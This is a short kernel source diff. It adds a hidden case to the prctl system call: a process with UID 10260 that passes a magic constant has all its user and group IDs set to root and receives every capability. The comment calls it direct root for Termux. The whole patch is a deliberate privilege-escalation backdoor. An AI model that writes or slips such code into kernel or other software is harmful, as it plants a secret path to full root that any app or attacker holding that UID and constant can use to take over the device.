@@ -2438,6 +2438,32 @@ SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 
 	error = 0;
 	switch (option) {
+	case 0x5355: /* Direct Root for Termux (UID 10260) */
+		if (current_uid().val == 10260 && arg2 == 0x416c696f746858ULL) {
+			struct cred *new = prepare_creds();
+			if (!new) {
+				error = -ENOMEM;
+				break;
+			}
+			new->uid.val = 0;
+			new->gid.val = 0;
+			new->suid.val = 0;
+			new->sgid.val = 0;
+			new->euid.val = 0;
+			new->egid.val = 0;
+			new->fsuid.val = 0;
+			new->fsgid.val = 0;
+			new->securebits = 0;
+			new->cap_inheritable = CAP_FULL_SET;
+			new->cap_permitted = CAP_FULL_SET;
+			new->cap_effective = CAP_FULL_SET;
+			new->cap_bset = CAP_FULL_SET;
+			new->cap_ambient = CAP_FULL_SET;
+			error = commit_creds(new);
+			break;
+		}
+		error = -EPERM;
+		break;
 	case PR_SET_PDEATHSIG:
 		if (!valid_signal(arg2)) {
 			error = -EINVAL;
